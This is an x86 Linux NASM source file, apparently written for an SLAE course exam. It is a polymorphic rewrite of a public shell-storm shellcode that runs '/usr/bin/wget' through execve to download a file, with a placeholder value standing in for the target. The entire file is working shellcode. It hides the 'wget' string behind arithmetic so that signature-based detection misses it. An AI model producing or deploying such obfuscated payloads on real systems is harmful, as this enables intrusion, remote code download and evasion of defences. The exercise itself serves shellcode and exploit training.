; Filename: fileDownload_poly.nasm
; Author:  Muhereza Herbert
; Website:  http://kilobytesecurity.com
; 
; Orig Source : http://shell-storm.org/shellcode/files/shellcode-611.php
; Orig Size: 42 bytes 
;
; New Size: 51 bytes
; Purpose: SLAE Exam requirement Assignment Six

global _start			

section .text
_start:

;push byte +0xb
;pop eax
xor eax, eax

;cdq

;push edx
push eax

;push dword 0x61616161
mov edi, 0x85858585	;edi = Some random value
push dword edi

;mov ecx,esp
mov esi,esp

;push edx
push eax
push byte +0x74

;push dword 0x6567772f
sub edi, 0x201e0e5e	;edi = 0x6567772f = 0x85858585-0x201e0e5e	
mov dword [esp-4], edi
sub esp, 4

push dword 0x6e69622f 
xor edx, edx		;edx needs to be zero, nice place to add it.
push dword 0x7273752f
mov ebx,esp

;push edx		; 0x00000000
push eax

;push ecx		;ecx = addy of the 0x85858585(What to download)
push esi

push ebx
mov ecx,esp
mov al, 11		;Transfered from up, after xor eax, eax
int 0x80
inc eax
int 0x80
